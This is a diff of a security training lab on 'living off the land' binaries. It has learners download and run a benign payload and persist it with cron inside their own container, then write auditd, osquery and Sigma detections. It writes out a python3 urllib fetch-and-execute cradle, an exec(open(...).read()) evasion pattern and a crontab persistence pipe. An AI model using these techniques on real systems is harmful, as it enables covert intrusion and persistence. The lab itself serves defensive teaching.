@@ -1,48 +1,103 @@
-# Lab 14 — Live Off the Land
+# Lab 14 — Live Off the Land (LOLBins)
 
 ## Setup
-A Windows VM (for LOLBAS) and/or a Linux container (for GTFOBins) you own — ideally with some
-logging (Sysmon, or the real-EVTX habit from Foundations module 05) so you can see your own
-tracks.
+
+```bash
+git clone https://github.com/plaintext-security/plaintext-labs.git
+cd plaintext-labs/offensive/14-lolbins-evasion
+make up
+```
+
+The container has Debian with `python3`, `curl`, `wget`, `crontab`, and `bash` —
+the native binaries used in the LOLBin chain. A benign stage-2 payload lives in
+`payload/stage2.py`.
 
 ## Scenario
-Accomplish a task — download and execute a payload, then persist — using only native, trusted
-binaries, then look at what you left behind.
 
-> Your own lab only.
+You have a shell on a Meridian Financial server. The endpoint has an EDR that
+blocks known-malicious binaries but allows native tools. Accomplish your
+objectives — download a payload, execute it, and persist — using only the
+system's own trusted binaries.
+
+> **Authorization note:** Only use LOLBins on systems you own or have explicit
+> written authorisation to test. This container is intentionally set up for
+> this lab.
 
 ## Do
-1. [ ] Using only native binaries, build a "download cradle" that fetches a file from your own
-   server. (Which native binary can download? Check LOLBAS/GTFOBins.)
-2. [ ] Execute your payload through a trusted binary rather than running it directly.
-3. [ ] Establish persistence using a native mechanism (scheduled task, registry, cron).
-4. [ ] Switch hats: inspect the logs/telemetry and identify what *still* reveals your activity.
+
+1. [ ] Run the demo to see the full LOLBin chain:
+   ```bash
+   make demo
+   ```
+   Note which binaries are used for each step (download, exec, persist).
+
+2. [ ] Read `lolbins_demo.py`. Trace each technique:
+   - Step 1: How does `python3 -c "import urllib.request; ..."` replace `curl`?
+   - Step 2: What does `exec(open(PATH).read())` do, and why does it evade signatures?
+   - Step 3: How does `(crontab -l; echo ...) | crontab -` avoid writing to `/etc/cron.d`?
+
+3. [ ] Shell into the container and try the download cradle manually:
+   ```bash
+   make shell
+   # Simulate a payload server on port 9999 (background):
+   python3 -m http.server 9999 --directory /lab/payload &
+   # Download via python3 urllib:
+   python3 -c "import urllib.request; open('/tmp/test.py','wb').write(urllib.request.urlopen('http://127.0.0.1:9999/stage2.py').read())"
+   python3 /tmp/test.py
+   ```
+
+4. [ ] For each detection artifact in Step 4:
+   - Write the auditd rule that would catch the download (python3 opening a TCP socket)
+   - Write the osquery query that would find the crontab entry writing to /tmp
+
+5. [ ] Read the Windows LOLBAS table (Step 5). For each Windows binary:
+   - Look up the entry on [LOLBAS](https://lolbas-project.github.io/)
+   - What is its normal purpose? What makes the malicious use hard to block?
 
 ## Success criteria — you're done when
-- [ ] You downloaded, executed, and persisted using only native binaries.
-- [ ] You can name the LOLBins you used and what each normally does.
-- [ ] You can point to the behavioural artifact that betrays the technique anyway.
+
+- [ ] You traced the download→exec→persist chain in `lolbins_demo.py` step by step.
+- [ ] You can explain what each native binary is *supposed* to do and why it's trusted.
+- [ ] You can describe the behavioural detection that catches each step.
+- [ ] You ran the download cradle manually and confirmed the payload executed.
 
 ## Deliverables
-`lolbins.md`: the binaries used, the cradle → exec → persistence chain, and the telemetry that
-detects it.
 
-## AI acceleration
-Have a model propose LOLBin techniques — then confirm each exists on your target and against
-LOLBAS/GTFOBins before relying on it.
-
-## Connects forward
-This is the attacker side of Track 02 (detection engineering) and Track 07 (hardening /
-allow-listing) — you're generating the exact behaviour they hunt.
-
-## Marketable proof
-> "I accomplish download/execute/persist using only native binaries (LOLBAS/GTFOBins) and can
-> explain the behavioural detections that catch it."
+`lolbins.md`: the binaries used for each step (Linux + Windows), the detection
+artifact that each generates, and the query/rule you'd write to catch it.
 
 ## Automate & own it
-**Required.** Script your LOLBin chain so it's reproducible, *and* note the matching detection
-idea for each step (a mini attacker→defender map); AI drafts, you verify each binary; commit it.
+
+**Required.** Write `lolbins_chain.sh` that:
+- Takes a payload URL and a drop path as arguments
+- Implements the full download→exec→persist chain in a single script
+- Uses only native binaries (no curl if python3 is available, etc.)
+
+AI drafts the script; you trace each step and verify the auditd events.
+Commit `lolbins_chain.sh` and `lolbins.md`.
+
+## AI acceleration
+
+Ask a model to generate YARA rules or Sigma rules that would detect
+`exec(open(PATH).read())` patterns in Python process arguments. Then test
+the rule logic against the actual command line from `make demo`.
+
+## Connects forward
+
+LOLBins are the operational layer for any post-exploitation in module 13
+(C2) and Track 06 (AD). The defensive inverse is Track 02, module 11
+(hunting-endpoint) — the Sysmon/osquery queries from that module would
+detect the crontab and process-chain artifacts here.
+
+## Marketable proof
+
+> "I can execute a full LOLBin chain on Linux using only native interpreters,
+> and I can write the behavioural detection rules that catch it anyway."
 
 ## Stretch
-- Take one technique and write the detection for it (a Sigma rule) — a direct preview of
-  Track 02.
+
+- Add a Windows LOLBin demo: on your eval VM, execute the `powershell` download
+  cradle and `certutil` chain from Step 5. Observe in Sysmon Event ID 1 (process
+  creation) and Event ID 3 (network connection).
+- Modify `lolbins_demo.py` to add a jitter to the download timing. Does this
+  affect the detection window?
